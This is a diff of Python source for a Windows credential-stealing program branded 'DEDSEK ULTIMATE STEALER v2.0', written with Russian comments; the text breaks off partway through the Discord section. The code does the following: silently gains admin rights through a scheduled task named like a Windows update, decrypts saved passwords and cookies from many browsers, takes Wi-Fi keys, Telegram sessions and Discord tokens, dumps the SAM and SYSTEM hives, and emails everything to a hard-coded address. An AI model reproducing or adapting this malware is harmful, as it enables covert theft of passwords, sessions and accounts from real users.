@@ -31,6 +31,7 @@ import winreg
 import zipfile
 import win32crypt
 import re
+import glob as _glob
 
 # ============================================================
 # >>> НАСТРОЙКИ <<<
@@ -45,6 +46,7 @@ RECEIVER_EMAIL = "xzx78848@gmail.com"
 # ============================================================
 
 attempts_left = MAX_ATTEMPTS
+ADMIN_FLAG = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'dedsek_admin.sys')
 
 # ========== СКРЫТИЕ CMD ==========
 def hide_console():
@@ -78,750 +80,694 @@ def restore_win_key():
     except:
         pass
 
-# ========== ПОВЫШЕНИЕ ПРАВ ДО АДМИНА ==========
-def run_as_admin():
+# ========== АВТО-АДМИН БЕЗ UAC ==========
+def run_as_admin_silent():
+    """Автоматически получает права админа БЕЗ ЗАПРОСА UAC через шедулер"""
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        try:
+            os.makedirs(os.path.dirname(ADMIN_FLAG), exist_ok=True)
+            with open(ADMIN_FLAG, 'w') as f: f.write('1')
+        except: pass
+        return True
+    
+    if os.path.exists(ADMIN_FLAG):
+        return False
+    
     try:
-        if ctypes.windll.shell32.IsUserAnAdmin():
-            return True
-        script = os.path.abspath(__file__)
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 1)
-        os._exit(0)
-    except:
-        pass
+        os.makedirs(os.path.dirname(ADMIN_FLAG), exist_ok=True)
+        with open(ADMIN_FLAG, 'w') as f: f.write('1')
+    except: pass
+    
+    script_path = os.path.abspath(__file__)
+    pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
+    task_name = "WindowsUpdate_KB5034441"
+    
+    os.system(f'schtasks /delete /tn "{task_name}" /f >nul 2>&1')
+    
+    task_cmd = f'schtasks /create /tn "{task_name}" /tr "\\"{pythonw_path}\\" \\"{script_path}\\"" /sc ONLOGON /rl HIGHEST /f /it'
+    subprocess.run(task_cmd, shell=True, capture_output=True)
+    
+    # Запускаем задачу
+    os.system(f'schtasks /run /tn "{task_name}" >nul 2>&1')
+    os._exit(0)
     return False
 
-# ========== EDGE РАСШИФРОВКА ==========
-def steal_edge_passwords():
-    result = []
-    paths = [
-        os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
-        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
-    ]
-    
-    for login_path in paths:
-        if not os.path.exists(login_path):
-            continue
-        try:
-            master_key = None
-            local_state_path = os.path.join(os.path.dirname(os.path.dirname(login_path)), 'Local State')
-            if os.path.exists(local_state_path):
-                try:
-                    with open(local_state_path, 'r', encoding='utf-8') as f:
-                        local_state = json.load(f)
-                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-                    encrypted_key = encrypted_key[5:]
-                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-                except:
-                    pass
-            
-            temp_db = os.path.join(tempfile.gettempdir(), f'edge_{random.randint(1000,9999)}.db')
-            shutil.copy2(login_path, temp_db)
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            
-            for row in cursor.fetchall():
-                url = row[0]
-                username = row[1]
-                encrypted_password = row[2]
-                
-                try:
-                    if encrypted_password[:3] == b'\x76\x31\x31' and master_key:
-                        password = _decrypt_aes_gcm(encrypted_password[3:], master_key)
-                    else:
-                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
-                    password = password.decode('utf-8', errors='ignore')
-                    result.append(f"EDGE | {url} | {username} | {password}")
-                except:
-                    result.append(f"EDGE | {url} | {username} | ***")
-            
-            conn.close()
-            try:
-                os.remove(temp_db)
-            except:
-                pass
-        except:
-            pass
-    
-    return result
-
+# ========== РАСШИФРОВКА ==========
 def _decrypt_aes_gcm(data, key):
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-    nonce = data[:12]
-    ciphertext = data[12:]
-    aesgcm = AESGCM(key)
-    return aesgcm.decrypt(nonce, ciphertext, None)
+    try:
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+        return AESGCM(key).decrypt(data[:12], data[12:], None)
+    except: return None
 
-# ========== CHROMIUM ПАРОЛИ ==========
-def steal_chromium_passwords(browser_name, paths):
-    result = []
-    for login_path in paths:
-        if not os.path.exists(login_path):
-            continue
+def _get_master_key(login_path):
+    local_state = os.path.join(os.path.dirname(os.path.dirname(login_path)), 'Local State')
+    if os.path.exists(local_state):
         try:
-            master_key = None
-            local_state_path = os.path.join(os.path.dirname(os.path.dirname(login_path)), 'Local State')
-            if os.path.exists(local_state_path):
+            with open(local_state, 'r', encoding='utf-8') as f:
+                key_b64 = json.load(f)['os_crypt']['encrypted_key']
+            return win32crypt.CryptUnprotectData(base64.b64decode(key_b64)[5:], None, None, None, 0)[1]
+        except: pass
+    return None
+
+def steal_chromium(browser, paths):
+    res = []
+    for lp in paths:
+        if not os.path.exists(lp): continue
+        try:
+            mk = _get_master_key(lp)
+            db = os.path.join(tempfile.gettempdir(), f'{browser}_{random.randint(0,9999)}.db')
+            shutil.copy2(lp, db)
+            cur = sqlite3.connect(db).cursor()
+            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for url, user, pw in cur:
                 try:
-                    with open(local_state_path, 'r', encoding='utf-8') as f:
-                        local_state = json.load(f)
-                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-                    encrypted_key = encrypted_key[5:]
-                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-                except:
-                    pass
-            
-            temp_db = os.path.join(tempfile.gettempdir(), f'{browser_name}_{random.randint(1000,9999)}.db')
-            shutil.copy2(login_path, temp_db)
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            
-            for row in cursor.fetchall():
-                url = row[0]
-                username = row[1]
-                encrypted_password = row[2]
-                
-                try:
-                    if encrypted_password[:3] == b'\x76\x31\x31' and master_key:
-                        password = _decrypt_aes_gcm(encrypted_password[3:], master_key)
+                    if pw[:3] == b'\x76\x31\x31' and mk:
+                        pwd = _decrypt_aes_gcm(pw[3:], mk)
+                        if pwd: pwd = pwd.decode('utf-8','ignore')
+                        else: pwd = "***"
                     else:
-                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
-                    password = password.decode('utf-8', errors='ignore')
-                    result.append(f"{browser_name} | {url} | {username} | {password}")
-                except:
-                    result.append(f"{browser_name} | {url} | {username} | ***")
-            
-            conn.close()
-            try:
-                os.remove(temp_db)
-            except:
-                pass
+                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
+                    res.append(f"{browser} | {url} | {user} | {pwd}")
+                except: res.append(f"{browser} | {url} | {user} | ***")
+            cur.close()
+            try: os.remove(db)
+            except: pass
+        except: pass
+    return res
+
+def steal_firefox():
+    res = []
+    base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
+    if not os.path.exists(base): return res
+    for folder in os.listdir(base):
+        pf = os.path.join(base, folder)
+        lf = os.path.join(pf, 'logins.json')
+        kf = os.path.join(pf, 'key4.db')
+        if not os.path.exists(lf) or not os.path.exists(kf): continue
+        try:
+            logins = json.load(open(lf, 'r', encoding='utf-8'))
+            cur = sqlite3.connect(kf).cursor()
+            cur.execute("SELECT a11, a102 FROM nssPrivate LIMIT 1")
+            row = cur.fetchone()
+            if not row or not row[1] or len(row[1]) < 24: continue
+            key = row[1][:24]
+            for login in logins.get('logins', []):
+                host = login.get('hostname', '')
+                user = pwd = "ERROR"
+                try:
+                    enc = base64.b64decode(login['encryptedUsername'])
+                    iv, ct = _parse_asn1(enc)
+                    if iv and ct:
+                        d = _decrypt_3des(ct, key, iv)
+                        if d: user = d.decode('utf-8','ignore').lstrip('\x00').strip()
+                except: pass
+                try:
+                    enc = base64.b64decode(login['encryptedPassword'])
+                    iv, ct = _parse_asn1(enc)
+                    if iv and ct:
+                        d = _decrypt_3des(ct, key, iv)
+                        if d: pwd = d.decode('utf-8','ignore').lstrip('\x00').strip()
+                except: pass
+                res.append(f"FIREFOX | {host} | {user} | {pwd}")
+            cur.close()
         except:
-            pass
-    return result
+            z = os.path.join(tempfile.gettempdir(), f'ff_{folder[:10]}.zip')
+            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for f in [lf, kf]:
+                    if os.path.exists(f): zf.write(f, os.path.basename(f))
+            send_file_email(z, f"Firefox {folder[:10]}")
+            try: os.remove(z)
+            except: pass
+            res.append(f"FIREFOX | {folder} | Файлы отправлены | Файлы отправлены")
+    return res
 
-# ========== FIREFOX ==========
-def decrypt_firefox_profile(profile_path):
-    result = []
+def _parse_asn1(data):
     try:
-        logins_file = os.path.join(profile_path, 'logins.json')
-        key4_file = os.path.join(profile_path, 'key4.db')
-        
-        if not os.path.exists(logins_file) or not os.path.exists(key4_file):
-            return result
-        
-        with open(logins_file, 'r', encoding='utf-8') as f:
-            logins_data = json.load(f)
-        
-        conn = sqlite3.connect(key4_file)
-        cursor = conn.cursor()
-        
-        cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
-        if not cursor.fetchone():
-            conn.close()
-            return result
-        
-        cursor.execute("SELECT a11, a102 FROM nssPrivate LIMIT 1")
-        row = cursor.fetchone()
-        if not row:
-            conn.close()
-            return result
-        
-        key_3des = row[1][:24] if row[1] and len(row[1]) >= 24 else None
-        if not key_3des:
-            conn.close()
-            return result
-        
-        for login in logins_data.get('logins', []):
-            hostname = login.get('hostname', '')
-            username = "ERROR"
-            password = "ERROR"
-            
-            try:
-                enc_user = base64.b64decode(login['encryptedUsername'])
-                iv, ct = _parse_firefox_asn1(enc_user)
-                if iv and ct:
-                    dec = _decrypt_3des(ct, key_3des, iv)
-                    if dec:
-                        username = dec.decode('utf-8', errors='ignore').lstrip('\x00').strip()
-            except:
-                pass
-            
-            try:
-                enc_pass = base64.b64decode(login['encryptedPassword'])
-                iv, ct = _parse_firefox_asn1(enc_pass)
-                if iv and ct:
-                    dec = _decrypt_3des(ct, key_3des, iv)
-                    if dec:
-                        password = dec.decode('utf-8', errors='ignore').lstrip('\x00').strip()
-            except:
-                pass
-            
-            result.append(f"FIREFOX | {hostname} | {username} | {password}")
-        
-        conn.close()
-    except:
-        pass
-    
-    if not result or all("ERROR" in r for r in result):
-        _send_firefox_files(profile_path, os.path.basename(profile_path))
-        result.append("FIREFOX: Файлы отправлены на почту")
-    
-    return result
-
-def _parse_firefox_asn1(data):
-    try:
-        if data[0] != 0x30:
-            return None, None
-        length = data[1]
-        offset = 2
-        if length & 0x80:
-            offset += length & 0x7F
-        iv = None
-        ct = None
-        end = offset + (length if not length & 0x80 else int.from_bytes(data[2:2+(length&0x7F)], 'big'))
-        while offset < len(data):
-            tag = data[offset]
-            offset += 1
-            item_len = data[offset]
-            offset += 1
-            item = data[offset:offset+item_len]
-            offset += item_len
+        if data[0] != 0x30: return None, None
+        off = 2 + (data[1] & 0x7F) if data[1] & 0x80 else 2
+        iv = ct = None
+        while off < len(data):
+            tag, l = data[off], data[off+1]
+            val = data[off+2:off+2+l]
             if tag == 0x04:
-                if iv is None:
-                    iv = item
-                else:
-                    ct = item
+                if iv is None: iv = val
+                else: ct = val
+            off += 2 + l
         return iv, ct
-    except:
-        return None, None
+    except: return None, None
 
 def _decrypt_3des(data, key, iv):
     try:
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
         from cryptography.hazmat.backends import default_backend
-        backend = default_backend()
-        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=backend)
-        decryptor = cipher.decryptor()
-        decrypted = decryptor.update(data) + decryptor.finalize()
-        return decrypted[:-decrypted[-1]] if decrypted[-1] < 16 else decrypted
-    except:
-        return None
+        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
+        r = dec.update(data) + dec.finalize()
+        return r[:-r[-1]] if r[-1] < 16 else r
+    except: return None
 
-# ========== SAM ДАМП (ИСПРАВЛЕН) ==========
-def dump_sam():
-    result = []
+# ========== СКАНЕР ПОРТОВ ==========
+def scan_ports():
+    """Сканирует открытые порты на localhost и роутере"""
+    res = []
     try:
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+        # Локальные порты через netstat
+        res.append("=== ЛОКАЛЬНЫЕ ПОРТЫ (netstat) ===")
+        netstat = subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+        res.append(netstat[:5000])
+    except: pass
+    
+    try:
+        # Сканируем популярные порты на роутере
+        gateway = "192.168.1.1"
+        try:
+            route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+            for line in route.split('\n'):
+                if '.' in line and any(c.isdigit() for c in line):
+                    gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
+                    if gw: gateway = gw[0]; break
+        except: pass
         
-        sam_path = os.path.join(tempfile.gettempdir(), 'sam')
-        sys_path = os.path.join(tempfile.gettempdir(), 'system')
+        res.append(f"\n=== СКАН РОУТЕРА {gateway} ===")
+        common_ports = [21,22,23,25,53,80,443,445,3306,3389,5900,8080,8443]
         
-        if is_admin:
-            os.system(f'reg save HKLM\\SAM "{sam_path}" /y >nul 2>&1')
-            os.system(f'reg save HKLM\\SYSTEM "{sys_path}" /y >nul 2>&1')
-        else:
-            ps_cmd = f'$samPath = "{sam_path}"; $sysPath = "{sys_path}"; reg save HKLM\\SAM $samPath /y 2>$null; reg save HKLM\\SYSTEM $sysPath /y 2>$null'
-            ps_file = os.path.join(tempfile.gettempdir(), 'dump.ps1')
-            with open(ps_file, 'w', encoding='utf-8') as f:
-                f.write(ps_cmd)
-            
-            cmd = f'powershell -Command "Start-Process PowerShell -Verb RunAs -ArgumentList \'-ExecutionPolicy Bypass -File {ps_file}\'"'
-            subprocess.run(cmd, shell=True, capture_output=True)
-            time.sleep(5)
-            
+        for port in common_ports:
             try:
-                os.remove(ps_file)
-            except:
-                pass
-        
-        if os.path.exists(sam_path) and os.path.getsize(sam_path) > 100:
-            hash_zip = os.path.join(tempfile.gettempdir(), 'sam_dump.zip')
-            with zipfile.ZipFile(hash_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
-                zf.write(sam_path, 'sam')
-                zf.write(sys_path, 'system')
-            send_file_email(hash_zip, "SAM+SYSTEM Dump")
-            result.append(f"SAM+SYSTEM отправлены! Размер: {os.path.getsize(sam_path)} байт")
-            for f in [hash_zip, sam_path, sys_path]:
-                try:
-                    os.remove(f)
-                except:
-                    pass
-        else:
-            result.append("Не удалось получить SAM")
-    except Exception as e:
-        result.append(f"Ошибка SAM: {e}")
-    return result
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                result = s.connect_ex((gateway, port))
+                if result == 0:
+                    res.append(f"ПОРТ {port}: ОТКРЫТ")
+                s.close()
+            except: pass
+    except: pass
+    
+    return '\n'.join(res)
 
-# ========== TELEGRAM / DISCORD ==========
-def find_telegram():
-    paths = [
-        os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata'),
-        os.path.join(os.environ['LOCALAPPDATA'], 'Telegram Desktop', 'tdata'),
+# ========== КРАЖА ВСЕХ КУКИСОВ ==========
+def steal_all_cookies():
+    """Крадёт куки из всех браузеров"""
+    results = []
+    
+    # Chrome куки
+    chrome_cookie_paths = [
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
     ]
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\TelegramDesktop", 0, winreg.KEY_READ)
-        paths.append(os.path.join(winreg.QueryValueEx(key, "InstallDir")[0], 'tdata'))
-        winreg.CloseKey(key)
-    except:
-        pass
-    for p in paths:
-        if os.path.exists(p):
-            return p
-    return None
-
-def find_discord_tokens():
-    tokens = set()
-    paths = [
-        os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
-        os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
-        os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
-    ]
-    for db in paths:
-        if not os.path.exists(db):
-            continue
-        for f in os.listdir(db):
-            if f.endswith('.ldb') or f.endswith('.log'):
+    
+    for cp in chrome_cookie_paths:
+        if os.path.exists(cp):
+            try:
+                db = os.path.join(tempfile.gettempdir(), f'chrome_cookies_{random.randint(0,9999)}.db')
+                shutil.copy2(cp, db)
+                cur = sqlite3.connect(db).cursor()
+                cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                for host, name, enc_val in cur.fetchall():
+                    try:
+                        val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8','ignore')
+                        results.append(f"CHROME | {host} | {name} | {val[:100]}")
+                    except: pass
+                cur.close()
+                try: os.remove(db)
+                except: pass
+            except: pass
+    
+    # Edge куки
+    edge_cookie_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
+    if os.path.exists(edge_cookie_path):
+        try:
+            db = os.path.join(tempfile.gettempdir(), f'edge_cookies_{random.randint(0,9999)}.db')
+            shutil.copy2(edge_cookie_path, db)
+            cur = sqlite3.connect(db).cursor()
+            cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
+            for host, name, enc_val in cur.fetchall():
                 try:
-                    with open(os.path.join(db, f), 'r', errors='ignore') as ff:
-                        tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', ff.read()))
-                except:
-                    pass
-    return list(tokens)[:20]
-
-# ========== ОТПРАВКА ==========
-def _send_firefox_files(profile_path, folder_name):
-    try:
-        z = os.path.join(tempfile.gettempdir(), f'ff_{folder_name[:10]}.zip')
-        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
-            for f in ['logins.json', 'key4.db']:
-                fp = os.path.join(profile_path, f)
-                if os.path.exists(fp):
-                    zf.write(fp, f)
-        send_file_email(z, f"Firefox {folder_name[:10]}")
-        os.remove(z)
-    except:
-        pass
-
-def _send_telegram(tg_path):
-    try:
-        z = os.path.join(tempfile.gettempdir(), 'telegram.zip')
-        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
-            for root, dirs, files in os.walk(tg_path):
-                for file in files:
-                    if file in ['key_datas', 'D877F783D5D3EF8C', 'settingss', 'maps'] or file.startswith('usertag') or file.startswith('data'):
-                        zf.write(os.path.join(root, file), file)
-        send_file_email(z, "Telegram")
-        os.remove(z)
-    except:
-        pass
+                    val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8','ignore')
+                    results.append(f"EDGE | {host} | {name} | {val[:100]}")
+                except: pass
+            cur.close()
+            try: os.remove(db)
+            except: pass
+        except: pass
+    
+    # Firefox куки
+    ff_base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
+    if os.path.exists(ff_base):
+        for folder in os.listdir(ff_base):
+            cookie_file = os.path.join(ff_base, folder, 'cookies.sqlite')
+            if os.path.exists(cookie_file):
+                try:
+                    db = os.path.join(tempfile.gettempdir(), f'ff_cookies_{random.randint(0,9999)}.db')
+                    shutil.copy2(cookie_file, db)
+                    cur = sqlite3.connect(db).cursor()
+                    cur.execute("SELECT host, name, value FROM moz_cookies")
+                    for host, name, val in cur.fetchall():
+                        results.append(f"FIREFOX | {host} | {name} | {val[:100]}")
+                    cur.close()
+                    try: os.remove(db)
+                    except: pass
+                except: pass
+    
+    return results[:500] if results else ["Куки не найдены"]
 
 # ========== МЕГА-СТИЛЕР ==========
-def mega_steal_data():
+def mega_steal():
+    R = []
+    R.append("="*60)
+    R.append("🔥 DEDSEK ULTIMATE STEALER v2.0 🔥")
+    R.append("="*60)
+    
+    # Система
+    R += [f"\n👤 USER: {os.environ.get('USERNAME')}", f"💻 PC: {socket.gethostname()}", f"📁 HOME: {os.environ.get('USERPROFILE')}"]
+    
+    # IP + Geo
+    try: R.append(f"🌐 LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
+    except: pass
     try:
-        R = ["=" * 60, "DEDSEK MEGA STEALER", "=" * 60]
-        
-        R += ["\n--- БАЗА ---", f"User: {os.environ.get('USERNAME')}", f"PC: {socket.gethostname()}"]
-        
-        R.append("\n--- IPCONFIG ---")
-        try:
-            R.append(subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')[:5000])
-        except:
-            pass
-        
-        R.append("\n--- IP / GEO ---")
-        try:
-            R.append(f"Local: {socket.gethostbyname(socket.gethostname())}")
-        except:
-            pass
-        try:
-            ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
-            g = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5).read())
-            R.append(f"Public: {ip} | {g.get('country','?')} | {g.get('city','?')}")
-        except:
-            pass
-        
-        R.append("\n--- WIFI ---")
-        try:
-            for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace').split('\n'):
-                if ':' in line and 'Все профили' in line:
-                    p = line.split(':')[1].strip()
-                    if p:
-                        det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-                        key = "НЕТ"
-                        for dl in det.split('\n'):
-                            if 'Содержимое ключа' in dl or 'Key Content' in dl:
-                                key = dl.split(':')[1].strip()
-                        R.append(f"WiFi: {p} | Пароль: {key}")
-        except:
-            pass
-        
-        R += ["\n" + "=" * 60, "ПАРОЛИ БРАУЗЕРОВ", "=" * 60]
-        
-        R.append("\n--- CHROME ---")
-        R.extend(steal_chromium_passwords("CHROME", [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')]) or ["Нет данных"])
-        
-        R.append("\n--- YANDEX ---")
-        R.extend(steal_chromium_passwords("YANDEX", [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')]) or ["Нет данных"])
-        
-        R.append("\n--- OPERA ---")
-        R.extend(steal_chromium_passwords("OPERA", [
+        ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
+        g = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5).read())
+        R.append(f"🌍 PUBLIC IP: {ip} | {g.get('country','?')} | {g.get('city','?')} | {g.get('isp','?')} | ZIP: {g.get('zip','?')}")
+    except: pass
+    
+    # IPCONFIG
+    try: R.append("\n📡 IPCONFIG:\n" + subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:5000])
+    except: pass
+    
+    # ARP
+    try: R.append("\n🔍 ARP:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:3000])
+    except: pass
+    
+    # NETSTAT
+    try: R.append("\n🔗 NETSTAT:\n" + subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:3000])
+    except: pass
+    
+    # DNS
+    try: R.append("\n📋 DNS:\n" + subprocess.check_output("ipconfig /displaydns", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:3000])
+    except: pass
+    
+    # СКАН ПОРТОВ
+    R.append("\n" + "="*60)
+    R.append("🔍 СКАНЕР ПОРТОВ")
+    R.append("="*60)
+    R.append(scan_ports())
+    
+    # WiFi
+    try:
+        R.append("\n📶 WIFI:")
+        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
+            if 'Все профили' in line:
+                p = line.split(':')[1].strip()
+                if p:
+                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
+                    key = "НЕТ"
+                    for dl in det.split('\n'):
+                        if 'Содержимое ключа' in dl or 'Key Content' in dl:
+                            key = dl.split(':')[1].strip()
+                    R.append(f"  {p}: {key}")
+    except: pass
+    
+    # Systeminfo
+    try: R.append("\n🖥 SYSTEMINFO:\n" + subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:3000])
+    except: pass
+    
+    # Браузеры
+    R += ["\n" + "="*60, "🔐 ПАРОЛИ БРАУЗЕРОВ", "="*60]
+    
+    browsers = {
+        "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
+        "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
+        "OPERA": [
             os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Login Data'),
             os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Opera Software', 'Opera Stable', 'Login Data')
-        ]) or ["Нет данных"])
+        ],
+        "EDGE": [
+            os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
+            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
+        ],
+        "BRAVE": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data')],
+        "VIVALDI": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Vivaldi', 'User Data', 'Default', 'Login Data')],
+    }
+    
+    for name, paths in browsers.items():
+        data = steal_chromium(name, paths)
+        R.append(f"\n--- {name} ---")
+        R.extend(data if data else ["Нет данных"])
+    
+    R.append("\n--- FIREFOX ---")
+    R.extend(steal_firefox() or ["Нет данных"])
+    
+    # КУКИ
+    R += ["\n" + "="*60, "🍪 КУКИ (COOKIES)", "="*60]
+    R.extend(steal_all_cookies())
+    
+    # SAM
+    R += ["\n" + "="*60, "🔑 ПАРОЛЬ WINDOWS", "="*60]
+    try:
+        sp = os.path.join(tempfile.gettempdir(), 'sam')
+        syp = os.path.join(tempfile.gettempdir(), 'system')
         
-        R.append("\n--- EDGE ---")
-        R.extend(steal_edge_passwords() or ["Нет данных"])
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            os.system(f'reg save HKLM\\SAM "{sp}" /y >nul 2>&1')
+            os.system(f'reg save HKLM\\SYSTEM "{syp}" /y >nul 2>&1')
         
-        R.append("\n--- FIREFOX ---")
-        ff = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
-        if os.path.exists(ff):
-            for folder in os.listdir(ff):
-                pf = os.path.join(ff, folder)
-                if os.path.exists(os.path.join(pf, 'logins.json')):
-                    R.append(f"\nПрофиль: {folder}")
-                    R.extend(decrypt_firefox_profile(pf))
-        
-        R += ["\n" + "=" * 60, "WINDOWS PASSWORD", "=" * 60]
-        R.extend(dump_sam())
-        
-        R.append("\n--- TELEGRAM ---")
-        tg = find_telegram()
-        if tg:
-            _send_telegram(tg)
-            R.append("Сессия отправлена!")
+        if os.path.exists(sp) and os.path.getsize(sp) > 100:
+            z = os.path.join(tempfile.gettempdir(), 'sam.zip')
+            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
+                zf.write(sp, 'sam'); zf.write(syp, 'system')
+            send_file_email(z, "SAM+SYSTEM")
+            R.append("✅ SAM+SYSTEM отправлены!")
+            for f in [z, sp, syp]:
+                try: os.remove(f)
+                except: pass
         else:
-            R.append("Не найден")
-        
-        R.append("\n--- DISCORD ---")
-        tokens = find_discord_tokens()
-        R.extend([f"ТОКЕН: {t}" for t in tokens] if tokens else ["Нет"])
-        
-        R += ["\n" + "=" * 60, f"ОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}"]
-        
-        text = '\n'.join(R)
-        for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
-            send_email(part, f"DedSek [{i+1}]")
+            R.append("❌ Нет прав админа (будет при следующем запуске)")
     except Exception as e:
-        send_email(f"Ошибка: {e}")
+        R.append(f"❌ Ошибка: {e}")
+    
+    # Telegram
+    R.append("\n--- 📱 TELEGRAM ---")
+    tg = None
+    for p in [os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata'), os.path.join(os.environ['LOCALAPPDATA'], 'Telegram Desktop', 'tdata')]:
+        if os.path.exists(p): tg = p; break
+    if tg:
+        try:
+            z = os.path.join(tempfile.gettempdir(), 'tg.zip')
+            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for r,d,files in os.walk(tg):
+                    for f in files:
+                        if f in ['key_datas','D877F783D5D3EF8C','settingss','maps'] or f.startswith('usertag') or f.startswith('data'):
+                            zf.write(os.path.join(r,f), f)
+            send_file_email(z, "Telegram")
+            try: os.remove(z)
+            except: pass
+            R.append("✅ Сессия отправлена!")
+        except: R.append("❌ Ошибка")
+    else: R.append("Не найден")
+    
+    # Discord
+    R.append("\n--- 🎮 DISCORD ---")
+    tokens = set()
